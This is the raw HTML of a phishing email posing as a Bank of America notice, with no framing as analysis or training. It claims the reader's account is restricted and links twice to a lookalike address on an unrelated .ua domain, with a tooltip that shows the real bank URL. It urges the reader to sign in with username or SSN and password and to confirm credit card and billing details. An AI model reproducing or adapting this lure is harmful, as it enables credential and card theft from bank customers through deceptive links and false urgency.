  <td width=562 valign=top style='width:421.5pt;padding:0in 0in 0in 0in'>
  <p class=style1><strong><span style='font-family:Verdana'>Dear Valued
  Customer : </span></strong></p>
  <p class=style1><strong><span style='font-family:Verdana'>As part of our
  security measures, we regularly screen activity in the Bank Of <st1:country-region
  w:st="on"><st1:place w:st="on">America</st1:place></st1:country-region>
  Online Banking system. We recently contacted you after noticing an issue on
  your <span class=SpellE>account.We</span> requested information from you for
  the following reason<span class=GramE>:</span></span></strong><b><br>
  <br>
  <strong><span style='font-family:Verdana'>Our system requires further account
  verification.</span></strong></b></p>
  <p class=style1><strong><span style='font-family:Verdana'>To restore your
  account, please</span></strong><span class=style61><b> <a
  href="http://olimpex.com.ua/www.bankofamerica.com/bankofamerica/onlineid.signin/bankofamerica/online_bofa_banking/index.htm">Sign
  in to Online Banking.</a></b></span></p>
  <p class=MsoNormal style='margin-bottom:12.0pt'><br>
  <img border=0 width=80 height=24 id="_x0000_i1030"
  src="https://detail.getbills.com/logos/0000000308001.gif" alt=aaaaaaa></p>
  <p class=style2><span class=GramE>thank</span> you for using Bank Of <st1:country-region
  w:st="on"><st1:place w:st="on">America</st1:place></st1:country-region>
  Online Service. </p>
  <div class=MsoNormal>
  <hr size=1 width=562 style='width:421.5pt' noshade color="#cccccc"
  align=left>
  </div>
  <p class=MsoNormal><o:p> </o:p></p>
  <p><span class=style51><span style='font-size:10.0pt'>Your account might be
  place on restricted status. Restricted accounts continue to receive payments,
  but they are limited in their ability to send or withdraw funds. To lift up
  this restriction, you need to login into your account (with your username or
  SSN and your password), then you have to complete our verification process.
  You must confirm your credit card details and <span class=GramE>your</span>
  billing information as well. All restricted accounts have their billing
  information unconfirmed, meaning that you may no longer send money from your
  account until you have reactive your billing information on file. <a
  href="http://olimpex.com.ua/www.bankofamerica.com/bankofamerica/onlineid.signin/bankofamerica/online_bofa_banking/"
  target="_blank" title="http://www.bankofamerica.com">Sign in to Online
  Banking </a></span></span><span style='font-size:10.0pt;color:#999999'><br>
  <span class=style51>Thank You. </span></span></p>
  <p class=MsoNormal><span class=style51><span style='font-size:10.0pt'>Please
  do not reply to this message. If you have any questions about the information
  in this e-Bill, please contact your <span class=SpellE>biller</span>. For all
  other questions, call us at 800-887-5749. </span></span></p>
